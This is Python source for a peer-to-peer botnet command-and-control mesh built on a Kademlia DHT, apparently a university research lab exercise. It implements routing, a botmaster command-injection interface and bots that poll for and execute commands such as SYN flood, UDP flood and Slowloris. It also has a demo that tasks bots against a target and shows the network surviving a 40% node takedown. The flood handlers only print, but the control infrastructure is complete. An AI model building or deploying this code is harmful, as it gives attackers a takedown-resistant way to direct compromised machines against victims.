"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Phase 3 - Kademlia P2P DHT Botnet Mesh
 Environment: ISOLATED VM LAB ONLY
====================================================

Phase 3 eliminates the centralized C2 server entirely.
Each bot is a full peer in a Kademlia Distributed Hash
Table (DHT) mesh.

Kademlia fundamentals implemented here:
  - 160-bit node IDs (SHA-1 of hostname+port)
  - XOR distance metric: d(x,y) = x XOR y
  - K-buckets (k=8): routing table of closest neighbors
  - RPCs: PING, FIND_NODE, STORE, FIND_VALUE
  - Node churn handling: bucket refresh + liveness probing
  - Sybil attack resistance: probe before displacing old nodes

Why this defeats takedowns:
  - No single IP or domain to seize
  - Kill 30% of nodes → mesh self-heals via routing table updates
  - Commands stored as key-value pairs distributed across peers
  - Botmaster injects commands by calling STORE on any live node

UDP-based transport (matching real Kademlia implementations).
Messages are JSON-serialized and AES-encrypted.
"""

import os
import sys
import time
import json
import math
import random
import socket
import hashlib
import threading
import struct
import base64
from datetime import datetime
from collections import OrderedDict
from typing import Optional

# ── Constants ─────────────────────────────────────────────────
K          = 8       # k-bucket size (max peers per bucket)
ALPHA      = 3       # concurrency factor for iterative lookups
ID_BITS    = 160     # node ID length in bits
BUCKET_COUNT = ID_BITS  # one bucket per bit position

PING_TIMEOUT      = 2.0   # seconds to wait for PING response
FIND_TIMEOUT      = 3.0   # seconds to wait for FIND_NODE response
REFRESH_INTERVAL  = 300   # seconds between bucket refresh sweeps
REPLICATE_INTERVAL= 3600  # seconds between value replication

# Shared AES key (same on all bots — derived from shared secret)
P2P_SECRET = b"AUA_P2P_MESH_KEY"

# ── Node ID ───────────────────────────────────────────────────

class NodeID:
    """160-bit node identifier. Arithmetic uses XOR distance metric."""

    def __init__(self, value: int):
        assert 0 <= value < (1 << ID_BITS)
        self.value = value

    @classmethod
    def from_bytes(cls, b: bytes) -> "NodeID":
        return cls(int.from_bytes(b[:20], "big"))

    @classmethod
    def from_host_port(cls, host: str, port: int) -> "NodeID":
        raw = hashlib.sha1(f"{host}:{port}".encode()).digest()
        return cls.from_bytes(raw)

    @classmethod
    def random(cls) -> "NodeID":
        return cls(random.getrandbits(ID_BITS))

    def distance(self, other: "NodeID") -> int:
        """XOR distance metric: d(x,y) = x XOR y"""
        return self.value ^ other.value

    def bucket_index(self, other: "NodeID") -> int:
        """
        Returns which k-bucket `other` belongs to from `self`'s perspective.
        Bucket i contains nodes whose XOR distance has its highest bit at position i.
        """
        d = self.distance(other)
        if d == 0:
            return -1  # same node
        return ID_BITS - 1 - d.bit_length() + 1

    def to_hex(self) -> str:
        return f"{self.value:040x}"

    def __eq__(self, other):
        return isinstance(other, NodeID) and self.value == other.value

    def __hash__(self):
        return hash(self.value)

    def __repr__(self):
        return f"NodeID({self.value:040x})"

    def to_dict(self) -> dict:
        return {"id_hex": self.to_hex()}

    @classmethod
    def from_dict(cls, d: dict) -> "NodeID":
        return cls(int(d["id_hex"], 16))


# ── Contact (peer info) ───────────────────────────────────────

class Contact:
    """Represents a known peer in the Kademlia network."""

    def __init__(self, node_id: NodeID, host: str, port: int):
        self.node_id    = node_id
        self.host       = host
        self.port       = port
        self.last_seen  = time.time()
        self.fail_count = 0

    def to_dict(self) -> dict:
        return {
            "id_hex": self.node_id.to_hex(),
            "host": self.host,
            "port": self.port,
        }

    @classmethod
    def from_dict(cls, d: dict) -> "Contact":
        return cls(NodeID(int(d["id_hex"], 16)), d["host"], d["port"])

    def __eq__(self, other):
        return isinstance(other, Contact) and self.node_id == other.node_id

    def __hash__(self):
        return hash(self.node_id)

    def __repr__(self):
        return f"Contact({self.node_id.to_hex()[:8]}...@{self.host}:{self.port})"


# ── K-Bucket ──────────────────────────────────────────────────

class KBucket:
    """
    A single k-bucket holding at most K contacts.
    Contacts are ordered by recency (LRU-style).
    Sybil resistance: before evicting the oldest contact, probe it.
    If still alive, discard the new node instead of evicting.
    """

    def __init__(self, k: int = K):
        self.k        = k
        self.contacts = OrderedDict()   # node_id.value -> Contact
        self.lock     = threading.Lock()

    def add(self, contact: Contact, ping_fn=None) -> bool:
        """
        Attempt to add a contact to this bucket.
        Returns True if added, False if bucket full and oldest is alive.
        """
        with self.lock:
            key = contact.node_id.value

            # Already in bucket — update recency
            if key in self.contacts:
                self.contacts.move_to_end(key)
                self.contacts[key].last_seen = time.time()
                self.contacts[key].fail_count = 0
                return True

            # Bucket has space — just add
            if len(self.contacts) < self.k:
                self.contacts[key] = contact
                return True

            # Bucket full — probe the oldest (Sybil resistance)
            oldest_key = next(iter(self.contacts))
            oldest = self.contacts[oldest_key]

            if ping_fn is not None:
                alive = ping_fn(oldest)
            else:
                alive = False   # assume dead if no ping function

            if alive:
                # Oldest is still live — move to end, discard new contact
                self.contacts.move_to_end(oldest_key)
                oldest.last_seen = time.time()
                return False
            else:
                # Oldest is dead — evict and add new
                del self.contacts[oldest_key]
                self.contacts[key] = contact
                return True

    def get_closest(self, n: int = K) -> list[Contact]:
        """Return up to n contacts, most recently seen first."""
        with self.lock:
            return list(reversed(list(self.contacts.values())))[:n]

    def remove(self, node_id: NodeID):
        with self.lock:
            self.contacts.pop(node_id.value, None)

    def __len__(self):
        with self.lock:
            return len(self.contacts)


# ── Routing Table ─────────────────────────────────────────────

class RoutingTable:
    """
    Full Kademlia routing table: 160 k-buckets.
    Bucket i holds contacts whose XOR distance from self has highest bit at position i.
    """

    def __init__(self, self_id: NodeID, k: int = K):
        self.self_id = self_id
        self.k       = k
        self.buckets = [KBucket(k) for _ in range(BUCKET_COUNT)]

    def add(self, contact: Contact, ping_fn=None) -> bool:
        if contact.node_id == self.self_id:
            return False
        idx = self.self_id.bucket_index(contact.node_id)
        if idx < 0:
            return False
        return self.buckets[idx].add(contact, ping_fn)

    def find_closest(self, target_id: NodeID, n: int = K) -> list[Contact]:
        """
        Find the n closest contacts to target_id using XOR distance.
        Searches all buckets and sorts by XOR distance.
        """
        candidates = []
        for bucket in self.buckets:
            candidates.extend(bucket.get_closest())
        # Sort by XOR distance to target
        candidates.sort(key=lambda c: c.node_id.distance(target_id))
        return candidates[:n]

    def remove(self, node_id: NodeID):
        idx = self.self_id.bucket_index(node_id)
        if 0 <= idx < BUCKET_COUNT:
            self.buckets[idx].remove(node_id)

    def all_contacts(self) -> list[Contact]:
        contacts = []
        for bucket in self.buckets:
            contacts.extend(bucket.get_closest())
        return contacts

    def bucket_stats(self) -> list[int]:
        return [len(b) for b in self.buckets if len(b) > 0]


# ── Message encryption ────────────────────────────────────────

def _simple_encrypt(data: bytes, key: bytes = P2P_SECRET) -> bytes:
    """
    XOR-based stream cipher for P2P messages (lightweight for UDP).
    Key stream derived from SHA-256 of key + nonce.
    For production: replace with ChaCha20.
    """
    key_hash = hashlib.sha256(key).digest()
    result = bytearray(len(data))
    for i, byte in enumerate(data):
        result[i] = byte ^ key_hash[i % 32]
    return bytes(result)

def _simple_decrypt(data: bytes, key: bytes = P2P_SECRET) -> bytes:
    return _simple_encrypt(data, key)   # XOR is its own inverse


# ── RPC Messages ──────────────────────────────────────────────

class RPC:
    PING        = "PING"
    PONG        = "PONG"
    FIND_NODE   = "FIND_NODE"
    FOUND_NODES = "FOUND_NODES"
    STORE       = "STORE"
    FIND_VALUE  = "FIND_VALUE"
    FOUND_VALUE = "FOUND_VALUE"

def make_msg(rpc_type: str, sender: Contact, **kwargs) -> bytes:
    msg = {
        "rpc": rpc_type,
        "sender": sender.to_dict(),
        "ts": time.time(),
        **kwargs
    }
    raw = json.dumps(msg).encode()
    return _simple_encrypt(raw)

def parse_msg(data: bytes) -> dict | None:
    try:
        raw = _simple_decrypt(data)
        return json.loads(raw.decode())
    except Exception:
        return None


# ── P2P Kademlia Node ─────────────────────────────────────────

class KademliaNode:
    """
    Full Kademlia DHT node for the P2P botnet mesh.

    Each bot instantiates one KademliaNode.
    Bootstrap: provide at least one known peer (seed node).
    After joining, the node:
      1) Builds routing table via iterative FIND_NODE on own ID
      2) Polls for stored commands (FIND_VALUE on well-known key)
      3) Executes any commands found
      4) Periodically refreshes buckets to handle node churn
    """

    COMMAND_KEY = hashlib.sha1(b"botnet_command_v1").hexdigest()  # well-known DHT key

    def __init__(self, host: str, port: int, bootstrap_peers: list[tuple[str,int]] = None):
        self.host    = host
        self.port    = port
        self.node_id = NodeID.from_host_port(host, port)
        self.contact = Contact(self.node_id, host, port)
        self.routing = RoutingTable(self.node_id)
        self.store   = {}          # local key-value store
        self.store_lock = threading.Lock()
        self._running = False
        self._sock = None
        self._pending: dict[str, threading.Event] = {}  # msg_id -> Event
        self._responses: dict[str, dict] = {}           # msg_id -> response
        self._lock = threading.Lock()
        self.bootstrap_peers = bootstrap_peers or []
        self.executed_cmds: set[str] = set()  # prevent re-execution

        print(f"[P2P] Node ID: {self.node_id.to_hex()[:16]}...")
        print(f"[P2P] Listening on {host}:{port}")

    # ── Transport ─────────────────────────────────────────────

    def _bind(self):
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.settimeout(1.0)
        self._sock.bind((self.host, self.port))

    def _send(self, msg: bytes, host: str, port: int):
        try:
            self._sock.sendto(msg, (host, port))
        except Exception as e:
            pass  # UDP is best-effort

    def _send_rpc(self, rpc_type: str, host: str, port: int,
                  timeout: float = FIND_TIMEOUT, **kwargs) -> dict | None:
        """Send an RPC and wait for a response."""
        msg_id = hashlib.sha1(os.urandom(8)).hexdigest()[:8]
        evt = threading.Event()
        with self._lock:
            self._pending[msg_id] = evt
        data = make_msg(rpc_type, self.contact, msg_id=msg_id, **kwargs)
        self._send(data, host, port)
        evt.wait(timeout)
        with self._lock:
            self._pending.pop(msg_id, None)
            resp = self._responses.pop(msg_id, None)
        return resp

    def _recv_loop(self):
        """Background thread: receive and dispatch incoming UDP messages."""
        while self._running:
            try:
                data, addr = self._sock.recvfrom(65535)
            except socket.timeout:
                continue
            except Exception:
                break

            msg = parse_msg(data)
            if not msg:
                continue

            # Add sender to routing table
            try:
                sender_d = msg["sender"]
                sender = Contact.from_dict(sender_d)
                self.routing.add(sender, ping_fn=self._ping_contact)
            except Exception:
                pass

            rpc = msg.get("rpc", "")
            msg_id = msg.get("msg_id")

            # If this is a response to a pending request, deliver it
            if msg_id:
                with self._lock:
                    if msg_id in self._pending:
                        self._responses[msg_id] = msg
                        self._pending[msg_id].set()
                        continue

            # Otherwise handle as incoming request
            self._handle_incoming(msg, addr)

    def _handle_incoming(self, msg: dict, addr: tuple):
        """Handle an incoming RPC request."""
        rpc = msg.get("rpc", "")
        sender_d = msg.get("sender", {})
        msg_id = msg.get("msg_id", "")

        try:
            sender = Contact.from_dict(sender_d)
        except Exception:
            return

        if rpc == RPC.PING:
            # Respond with PONG
            resp = make_msg(RPC.PONG, self.contact, msg_id=msg_id)
            self._send(resp, sender.host, sender.port)

        elif rpc == RPC.FIND_NODE:
            target_hex = msg.get("target_id", "")
            if target_hex:
                target_id = NodeID(int(target_hex, 16))
                closest = self.routing.find_closest(target_id, K)
                resp = make_msg(RPC.FOUND_NODES, self.contact,
                                msg_id=msg_id,
                                nodes=[c.to_dict() for c in closest])
                self._send(resp, sender.host, sender.port)

        elif rpc == RPC.STORE:
            key = msg.get("key", "")
            value = msg.get("value", "")
            if key:
                with self.store_lock:
                    self.store[key] = {"value": value, "ts": time.time()}
                resp = make_msg(RPC.PONG, self.contact, msg_id=msg_id, stored=True)
                self._send(resp, sender.host, sender.port)

        elif rpc == RPC.FIND_VALUE:
            key = msg.get("key", "")
            with self.store_lock:
                entry = self.store.get(key)
            if entry:
                resp = make_msg(RPC.FOUND_VALUE, self.contact,
                                msg_id=msg_id, key=key, value=entry["value"])
            else:
                target_id = NodeID(int(hashlib.sha1(key.encode()).hexdigest(), 16))
                closest = self.routing.find_closest(target_id, K)
                resp = make_msg(RPC.FOUND_NODES, self.contact,
                                msg_id=msg_id,
                                nodes=[c.to_dict() for c in closest])
            self._send(resp, sender.host, sender.port)

    # ── Kademlia RPCs ─────────────────────────────────────────

    def _ping_contact(self, contact: Contact) -> bool:
        """PING a contact. Returns True if alive."""
        resp = self._send_rpc(RPC.PING, contact.host, contact.port, timeout=PING_TIMEOUT)
        return resp is not None and resp.get("rpc") == RPC.PONG

    def _find_node_rpc(self, contact: Contact, target_id: NodeID) -> list[Contact]:
        """FIND_NODE RPC: ask contact for closest peers to target_id."""
        resp = self._send_rpc(RPC.FIND_NODE, contact.host, contact.port,
                              target_id=target_id.to_hex())
        if not resp or resp.get("rpc") != RPC.FOUND_NODES:
            return []
        nodes = resp.get("nodes", [])
        result = []
        for nd in nodes:
            try:
                result.append(Contact.from_dict(nd))
            except Exception:
                pass
        return result

    def _find_value_rpc(self, contact: Contact, key: str) -> tuple[str | None, list[Contact]]:
        """
        FIND_VALUE RPC.
        Returns (value, []) if found, or (None, [closer_nodes]) if not.
        """
        resp = self._send_rpc(RPC.FIND_VALUE, contact.host, contact.port, key=key)
        if not resp:
            return None, []
        if resp.get("rpc") == RPC.FOUND_VALUE:
            return resp.get("value"), []
        nodes = resp.get("nodes", [])
        closer = []
        for nd in nodes:
            try:
                closer.append(Contact.from_dict(nd))
            except Exception:
                pass
        return None, closer

    def _store_rpc(self, contact: Contact, key: str, value: str) -> bool:
        """STORE RPC: ask contact to store key→value."""
        resp = self._send_rpc(RPC.STORE, contact.host, contact.port, key=key, value=value)
        return resp is not None

    # ── Iterative lookups ─────────────────────────────────────

    def iterative_find_node(self, target_id: NodeID) -> list[Contact]:
        """
        Iterative FIND_NODE lookup.
        Queries ALPHA peers in parallel, progressively refining the closest set.
        Terminates when no closer nodes are returned.
        """
        closest = self.routing.find_closest(target_id, K)
        if not closest:
            return []

        queried: set[int] = set()
        # Sort by distance
        closest.sort(key=lambda c: c.node_id.distance(target_id))

        for _ in range(20):  # max iterations
            # Pick ALPHA unqueried contacts from the closest set
            to_query = [c for c in closest if c.node_id.value not in queried][:ALPHA]
            if not to_query:
                break

            new_contacts = []
            threads = []

            def query(c):
                queried.add(c.node_id.value)
                returned = self._find_node_rpc(c, target_id)
                new_contacts.extend(returned)
                for nc in returned:
                    self.routing.add(nc, ping_fn=self._ping_contact)

            for c in to_query:
                t = threading.Thread(target=query, args=(c,))
                t.daemon = True
                threads.append(t)
                t.start()
            for t in threads:
                t.join(timeout=FIND_TIMEOUT + 1)

            if not new_contacts:
                break

            # Merge and re-sort
            for nc in new_contacts:
                if nc.node_id != self.node_id and nc not in closest:
                    closest.append(nc)
            closest.sort(key=lambda c: c.node_id.distance(target_id))
            closest = closest[:K]

        return closest

    def iterative_find_value(self, key: str) -> str | None:
        """
        Iterative FIND_VALUE lookup.
        Returns the stored value if found in the DHT, else None.
        """
        target_id = NodeID(int(hashlib.sha1(key.encode()).hexdigest(), 16))
        closest   = self.routing.find_closest(target_id, K)
        if not closest:
            return None

        queried: set[int] = set()
        closest.sort(key=lambda c: c.node_id.distance(target_id))

        for _ in range(20):
            to_query = [c for c in closest if c.node_id.value not in queried][:ALPHA]
            if not to_query:
                break

            found_value = [None]
            new_contacts = []

            def query(c):
                queried.add(c.node_id.value)
                val, closer = self._find_value_rpc(c, key)
                if val is not None:
                    found_value[0] = val
                new_contacts.extend(closer)
                for nc in closer:
                    self.routing.add(nc, ping_fn=self._ping_contact)

            threads = [threading.Thread(target=query, args=(c,)) for c in to_query]
            for t in threads:
                t.daemon = True
                t.start()
            for t in threads:
                t.join(timeout=FIND_TIMEOUT + 1)

            if found_value[0] is not None:
                return found_value[0]
            if not new_contacts:
                break
            for nc in new_contacts:
                if nc not in closest:
                    closest.append(nc)
            closest.sort(key=lambda c: c.node_id.distance(target_id))
            closest = closest[:K]

        return None

    def store_value(self, key: str, value: str) -> int:
        """
        Store a key-value pair in the DHT.
        Stores on the K closest nodes to the key's SHA-1 hash.
        Returns number of nodes that acknowledged the store.
        """
        target_id = NodeID(int(hashlib.sha1(key.encode()).hexdigest(), 16))
        # Also store locally
        with self.store_lock:
            self.store[key] = {"value": value, "ts": time.time()}

        closest = self.iterative_find_node(target_id)
        acks = 0
        for contact in closest[:K]:
            if self._store_rpc(contact, key, value):
                acks += 1
        return acks

    # ── Bootstrap ─────────────────────────────────────────────

    def bootstrap(self):
        """
        Join the P2P mesh by querying bootstrap peers.
        Performs iterative FIND_NODE on own ID to populate routing table.
        """
        print(f"[P2P] Bootstrapping from {len(self.bootstrap_peers)} seed peers...")
        for host, port in self.bootstrap_peers:
            seed_id = NodeID.from_host_port(host, port)
            seed    = Contact(seed_id, host, port)
            if self._ping_contact(seed):
                self.routing.add(seed)
                print(f"[P2P] Seed reachable: {host}:{port}")
            else:
                print(f"[P2P] Seed unreachable: {host}:{port}")

        # Iterative FIND_NODE on own ID populates routing table
        self.iterative_find_node(self.node_id)
        stats = self.routing.bucket_stats()
        total = sum(stats)
        print(f"[P2P] Routing table populated: {total} peers across {len(stats)} buckets")

    # ── Command handling ──────────────────────────────────────

    def _poll_for_commands(self):
        """
        Periodically look up the well-known command key in the DHT.
        If a new command is found, execute it once (dedup by content hash).
        """
        value = self.iterative_find_value(self.COMMAND_KEY)
        if not value:
            return

        cmd_hash = hashlib.sha256(value.encode()).hexdigest()[:16]
        if cmd_hash in self.executed_cmds:
            return   # already executed

        try:
            cmd = json.loads(value)
        except Exception:
            return

        print(f"\n[P2P] *** COMMAND RECEIVED from DHT ***")
        print(f"[P2P] Type: {cmd.get('type')}  Hash: {cmd_hash}")
        self.executed_cmds.add(cmd_hash)
        self._execute_command(cmd)

    def _execute_command(self, cmd: dict):
        """Execute a botnet command received via DHT."""
        cmd_type = cmd.get("type", "idle")
        print(f"[P2P] Executing: {json.dumps(cmd)}")

        if cmd_type == "syn_flood":
            print(f"[P2P] -> SYN Flood: {cmd.get('target')} for {cmd.get('duration')}s")
        elif cmd_type == "udp_flood":
            print(f"[P2P] -> UDP Flood: {cmd.get('target')} for {cmd.get('duration')}s")
        elif cmd_type == "slowloris":
            print(f"[P2P] -> Slowloris: {cmd.get('target')}:{cmd.get('port',80)}")
        elif cmd_type == "idle":
            print(f"[P2P] -> Idle")
        elif cmd_type == "shutdown":
            print(f"[P2P] -> Shutdown command received")
            self._running = False
        else:
            print(f"[P2P] -> Unknown: {cmd_type}")

    def inject_command(self, cmd: dict) -> int:
        """
        Botmaster interface: inject a command into the DHT.
        The command propagates to all nodes via STORE + iterative lookup.
        Returns number of nodes that stored it.
        """
        value = json.dumps(cmd)
        acks  = self.store_value(self.COMMAND_KEY, value)
        print(f"[P2P] Command injected: {cmd['type']} → stored on {acks} nodes")
        return acks

    # ── Maintenance loops ─────────────────────────────────────

    def _refresh_loop(self):
        """Periodically refresh stale k-buckets by performing random lookups."""
        while self._running:
            time.sleep(REFRESH_INTERVAL)
            if not self._running:
                break
            print(f"[P2P] Refreshing routing table...")
            # Perform random lookup in each non-empty bucket
            for i, bucket in enumerate(self.routing.buckets):
                if len(bucket) == 0:
                    continue
                # Generate a random ID in this bucket's range
                random_id = NodeID.random()
                self.iterative_find_node(random_id)
            stats = self.routing.bucket_stats()
            print(f"[P2P] Refresh complete. {sum(stats)} peers in table.")

    def _command_poll_loop(self, interval: int = 30):
        """Poll for commands from the DHT every `interval` seconds."""
        while self._running:
            time.sleep(interval + random.randint(-5, 5))
            if self._running:
                self._poll_for_commands()

    def _print_status(self, interval: int = 60):
        """Periodically print routing table status."""
        while self._running:
            time.sleep(interval)
            if not self._running:
                break
            contacts = self.routing.all_contacts()
            print(f"\n[P2P] Status @ {datetime.now().strftime('%H:%M:%S')}")
            print(f"[P2P]   Peers in routing table: {len(contacts)}")
            print(f"[P2P]   Local store keys: {len(self.store)}")
            if contacts:
                print(f"[P2P]   Sample peers:")
                for c in contacts[:3]:
                    print(f"[P2P]     {c.node_id.to_hex()[:12]}... @ {c.host}:{c.port}")

    # ── Start / stop ──────────────────────────────────────────

    def start(self):
        """Start the P2P node: bind socket, launch all threads, bootstrap."""
        self._bind()
        self._running = True

        threads = [
            threading.Thread(target=self._recv_loop, daemon=True, name="recv"),
            threading.Thread(target=self._refresh_loop, daemon=True, name="refresh"),
            threading.Thread(target=self._command_poll_loop, daemon=True, name="cmd_poll"),
            threading.Thread(target=self._print_status, daemon=True, name="status"),
        ]
        for t in threads:
            t.start()

        self.bootstrap()
        return threads

    def stop(self):
        self._running = False
        if self._sock:
            self._sock.close()

    def status(self) -> dict:
        contacts = self.routing.all_contacts()
        return {
            "node_id": self.node_id.to_hex(),
            "host": self.host,
            "port": self.port,
            "peer_count": len(contacts),
            "store_keys": list(self.store.keys()),
            "bucket_fill": self.routing.bucket_stats(),
        }


# ── Resilience demonstration ──────────────────────────────────

def demonstrate_resilience(nodes: list[KademliaNode], kill_fraction: float = 0.3):
    """
    Research demonstration: kill kill_fraction of nodes, show DHT still works.
    This is the core finding: P2P survives partial takedown.
    """
    n_kill = int(len(nodes) * kill_fraction)
    victims = random.sample(nodes, n_kill)
    survivors = [n for n in nodes if n not in victims]

    print(f"\n{'='*60}")
    print(f"[RESILIENCE] Simulating takedown of {n_kill}/{len(nodes)} nodes ({kill_fraction*100:.0f}%)")
    for v in victims:
        v.stop()
        print(f"[RESILIENCE] Killed: {v.node_id.to_hex()[:12]}... @ {v.host}:{v.port}")

    time.sleep(2)  # allow routing tables to detect failures

    print(f"\n[RESILIENCE] Testing command propagation with {len(survivors)} survivors...")
    if survivors:
        cmd = {"type": "syn_flood", "target": "192.168.100.20", "duration": 10}
        acks = survivors[0].inject_command(cmd)
        print(f"[RESILIENCE] Command stored on {acks}/{len(survivors)} surviving nodes")
        print(f"[RESILIENCE] Botnet operational despite {kill_fraction*100:.0f}% node loss ✓")
    print('='*60)


# ── Entry point ───────────────────────────────────────────────

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Kademlia P2P Botnet Node - AUA Research Lab")
    parser.add_argument("--host",      default="127.0.0.1",    help="Bind host")
    parser.add_argument("--port",      type=int, default=7400,  help="Bind port")
    parser.add_argument("--bootstrap", action="append",         help="seed host:port (repeat for multiple)",
                        metavar="HOST:PORT", default=[])
    parser.add_argument("--inject",    type=str, default=None,  help="Inject command JSON and exit")
    parser.add_argument("--demo",      action="store_true",     help="Run local 5-node demo")
    args = parser.parse_args()

    if args.demo:
        # ── Local demo: spin up 5 nodes on localhost ──────────────
        print("=" * 60)
        print(" Kademlia P2P Demo - 5 local nodes")
        print(" AUA Botnet Research Lab")
        print("=" * 60)

        BASE_PORT = 7500
        nodes_demo = []

        # Create nodes — each bootstraps from node 0
        for i in range(5):
            port = BASE_PORT + i
            peers = [("127.0.0.1", BASE_PORT)] if i > 0 else []
            node = KademliaNode("127.0.0.1", port, bootstrap_peers=peers)
            nodes_demo.append(node)

        # Start all nodes
        for n in nodes_demo:
            n.start()
            time.sleep(0.3)

        print("\n[DEMO] All nodes started. Waiting for routing tables to stabilize...")
        time.sleep(3)

        # Botmaster injects a command via node 0
        print("\n[DEMO] Botmaster injecting command via node 0...")
        nodes_demo[0].inject_command({
            "type": "syn_flood",
            "target": "192.168.100.20",
            "duration": 15
        })

        time.sleep(2)

        # All other nodes poll for it
        print("\n[DEMO] All nodes polling DHT for command...")
        for n in nodes_demo:
            val = n.iterative_find_value(KademliaNode.COMMAND_KEY)
            if val:
                print(f"  {n.node_id.to_hex()[:12]}... FOUND command: {json.loads(val)['type']}")
            else:
                print(f"  {n.node_id.to_hex()[:12]}... not found (routing table still building)")

        time.sleep(1)

        # Demonstrate resilience
        demonstrate_resilience(nodes_demo, kill_fraction=0.4)

        print("\n[DEMO] Demo complete. Press Ctrl+C to exit.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            for n in nodes_demo:
                n.stop()

    else:
        # ── Single node mode ──────────────────────────────────────
        print("=" * 60)
        print(" Kademlia P2P Node - AUA Botnet Research Lab")
        print(f" Node: {args.host}:{args.port}")
        print(" ISOLATED ENVIRONMENT ONLY")
        print("=" * 60)

        bootstrap_peers = []
        for bp in args.bootstrap:
            h, p = bp.rsplit(":", 1)
            bootstrap_peers.append((h, int(p)))

        node = KademliaNode(args.host, args.port, bootstrap_peers=bootstrap_peers)
        node.start()

        if args.inject:
            time.sleep(2)  # wait for bootstrap
            cmd = json.loads(args.inject)
            acks = node.inject_command(cmd)
            print(f"[P2P] Command injected: {cmd['type']} | {acks} acks")
            time.sleep(1)
            node.stop()
        else:
            print("\n[P2P] Running. Ctrl+C to stop.\n")
            try:
                while node._running:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[P2P] Shutting down...")
                node.stop()
